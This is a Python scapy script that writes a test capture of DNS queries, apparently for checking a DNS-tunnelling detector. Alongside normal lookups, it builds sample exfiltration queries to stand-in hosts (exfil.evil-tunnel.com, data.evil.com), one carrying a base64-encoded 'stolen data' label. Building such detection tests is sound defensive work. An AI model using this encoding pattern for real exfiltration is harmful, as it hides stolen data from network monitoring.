from scapy.all import IP, UDP, DNS, DNSQR, wrpcap

CLIENT = "10.0.0.20"
DNS_SERVER = "10.0.0.53"


def query(name):
    """Build one DNS question packet asking for the given name."""
    return IP(src=CLIENT, dst=DNS_SERVER) / UDP(sport=50000, dport=53) / DNS(rd=1, qd=DNSQR(qname=name))


packets = [
    query("google.com"),                                                            # normal: no alert
    query("mobile.events.data.microsoft.com"),                                      # normal, a bit long: no alert
    query("aGVsbG8gdGhpcyBpcyBzdG9sZW4gZGF0YQ.exfil.evil-tunnel.com"),              # long part: alert
    query("aGVsbG8gdGhpcyBpcyBzdG9sZW4gZGF0YQ.exfil.evil-tunnel.com"),              # same again: must NOT alert twice
    query("a1b2c3.d4e5f6.g7h8i9.j0k1l2.m3n4o5.p6q7r8.s9t0u1.v2w3x4.data.evil.com"), # very long name: alert
]

wrpcap("test_dns.pcap", packets)
print("Wrote test_dns.pcap")